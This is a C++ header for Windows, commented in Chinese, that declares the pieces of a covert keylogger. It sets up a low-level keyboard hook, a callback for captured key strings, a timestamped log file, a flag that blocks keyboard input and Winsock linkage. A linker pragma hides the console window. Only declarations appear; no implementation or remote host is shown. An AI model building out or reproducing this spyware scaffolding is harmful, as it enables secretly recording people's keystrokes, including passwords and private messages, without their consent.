#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <WinSock2.h>
#include <Windows.h>
#include <list>
#include <string>
#include <time.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

using namespace std;

typedef void(*processKeyString)(CHAR*, UINT);	//回调函数

UINT systemRunTime = NULL;	//系统启动时间 => 求每条消息的时间
CHAR logFileName[64] = { 0 };
HHOOK keyboardHook = NULL;
list<DWORD>controlKeyList;	//存放组合键的列表
BOOL __KeyDownShift = FALSE;	//当前是否按下Shift
BOOL __KeyDownCaps = FALSE;		//当前是否处于大写
BOOL disableKeyBoard = FALSE;	//关闭键盘，不允许输入
FILE* logFile = NULL;
CONST CHAR shiftNumTable[10] = { ')','!','@','#','$','%','^','&','*','(' };	//Shift + 数字 映射表
CHAR singleChar[10];	//	单个字符变量 <== HandleVirtualKeyCode
string keyStr;		//	组合按键变量 <== HandleVirtualKeyCode
time_t nowTime;			//	时间戳 <== HandleVirtualKeyCode
struct tm tm;			//	时间结构体 <== HandleVirtualKeyCode
CHAR nowDateTime[32];	//	每条消息的时间 <== HandleVirtualKeyCode
INT oldDay = 0;

UINT msgTime = 0;	//消息时间戳

processKeyString procKeyStrFun = NULL;


VOID HandleVirtualKeyCode(DWORD vCode, UINT time, BOOL Combination);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

BOOL OnHookKeyBoard(processKeyString procKeyStrFunction);
VOID UnHookKeyBoard();
